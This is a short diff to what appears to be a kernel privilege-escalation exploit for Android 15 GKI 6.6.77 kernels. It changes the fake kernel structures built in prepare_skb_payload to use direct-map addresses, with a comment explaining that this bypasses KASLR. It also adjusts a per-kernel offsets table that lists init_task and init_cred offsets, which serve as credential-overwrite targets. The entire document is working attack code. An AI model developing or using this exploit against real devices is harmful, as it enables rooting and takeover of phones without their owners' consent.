@@ -1,0 +1,34 @@
+diff --git a/src/core/util.c b/src/core/util.c
+index 54875e6..5d6de79 100644
+--- a/src/core/util.c
++++ b/src/core/util.c
+@@ -529,9 +529,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
+   uintptr_t write_pc = fake_parent;
+   uintptr_t write_right = fake_right;
+   uintptr_t write_left = fake_left;
+-  uint64_t waiter_task = text_addr(INIT_TASK);
+-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
+-  uint64_t pi_top_task = text_addr(INIT_TASK);
++  /* Use the direct-map alias rather than the image virtual address: the kernel
++   * image's virtual base is randomized by KASLR, but __va(phys) is not. Both
++   * forms point at the same physical page, so the kernel can dereference
++   * either one. */
++  uint64_t waiter_task = data_addr(INIT_TASK);
++  uint64_t task_group = data_addr(ROOT_TASK_GROUP);
++  uint64_t pi_top_task = data_addr(INIT_TASK);
+   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+     write_pc = SLIDE_LOGGERS_0_1;
+     write_right = 0;
+diff --git a/src/kernels/6.6.77-android15-8-g5770c661275f-abogki443185593-4k/offsets.h b/src/kernels/6.6.77-android15-8-g5770c661275f-abogki443185593-4k/offsets.h
+index fe9f0c4..82bd442 100644
+--- a/src/kernels/6.6.77-android15-8-g5770c661275f-abogki443185593-4k/offsets.h
++++ b/src/kernels/6.6.77-android15-8-g5770c661275f-abogki443185593-4k/offsets.h
+@@ -6,7 +6,7 @@ OFFSETS_ENTRY(
+     .phys_offset = 0x0,
+     .phys_offset_valid = 1,
+     .kernel_phys_load = 0x200000,
+-    .pselect_waiter_shift = 0,
++    .pselect_waiter_shift = -2,
+     .off_init_task = 0x020de280,
+     .off_init_cred = 0x020f0548,
+     .off_root_task_group = 0x022d4580,
